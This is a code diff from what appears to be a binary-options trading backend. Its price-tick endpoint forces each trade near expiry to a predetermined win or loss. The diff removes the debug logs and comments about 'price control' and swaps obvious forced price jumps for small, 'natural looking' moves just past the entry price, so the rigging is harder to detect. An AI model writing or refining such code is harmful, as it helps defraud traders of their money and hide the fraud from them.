@@ -3395,38 +3395,39 @@ async def add_chart_tick(symbol: str, authorization: Optional[str] = Header(None
         
         # Only manipulate in last 2 seconds before expiry
         if time_remaining <= 2:
-            print(f"[PRICE CONTROL] Last {time_remaining:.1f}s - User trade manipulation")
-            
             should_go_up = None
             
             # Use predetermined outcome to decide price direction
             if predetermined_outcome:
-                # If predetermined = "won", make price favor the trade direction
-                # If predetermined = "lost", make price go against the trade
                 if predetermined_outcome == "won":
-                    should_go_up = (trade_type == "call")  # UP trade needs price UP
+                    should_go_up = (trade_type == "call")
                 else:
-                    should_go_up = (trade_type != "call")  # UP trade loses when price DOWN
-                
-                print(f"[PRICE CONTROL] predetermined={predetermined_outcome}, trade_type={trade_type}, should_go_up={should_go_up}")
+                    should_go_up = (trade_type != "call")
             
-            # Apply price manipulation
+            # Apply SUBTLE price manipulation - natural looking candles
             if should_go_up is not None:
-                min_diff = entry_price * 0.0003
-                if should_go_up:
-                    # Force price ABOVE entry
-                    if base_price <= entry_price:
-                        change = abs(entry_price - base_price) + min_diff + volatility * 3
-                    else:
-                        change = abs(change) * 2.0 + min_diff
-                else:
-                    # Force price BELOW entry
-                    if base_price >= entry_price:
-                        change = -(abs(base_price - entry_price) + min_diff + volatility * 3)
-                    else:
-                        change = -abs(change) * 2.0 - min_diff
+                # Calculate how much we need to move to be profitable
+                # Use very small, natural-looking increments
+                min_profit_diff = entry_price * 0.00005  # Just 0.005% above/below entry (very small)
                 
-                print(f"[PRICE CONTROL] entry={entry_price:.5f}, new_price={base_price + change:.5f}")
+                if should_go_up:
+                    # Need price to be slightly ABOVE entry
+                    target_price = entry_price + min_profit_diff
+                    if base_price < target_price:
+                        # Gradually move up - small natural change
+                        change = min(volatility * 1.2, target_price - base_price + volatility * 0.3)
+                    else:
+                        # Already above entry, just add small positive movement
+                        change = abs(random.random() * volatility * 0.8)
+                else:
+                    # Need price to be slightly BELOW entry
+                    target_price = entry_price - min_profit_diff
+                    if base_price > target_price:
+                        # Gradually move down - small natural change
+                        change = -min(volatility * 1.2, base_price - target_price + volatility * 0.3)
+                    else:
+                        # Already below entry, just add small negative movement
+                        change = -abs(random.random() * volatility * 0.8)
     
     # Reset random seed
     random.seed()
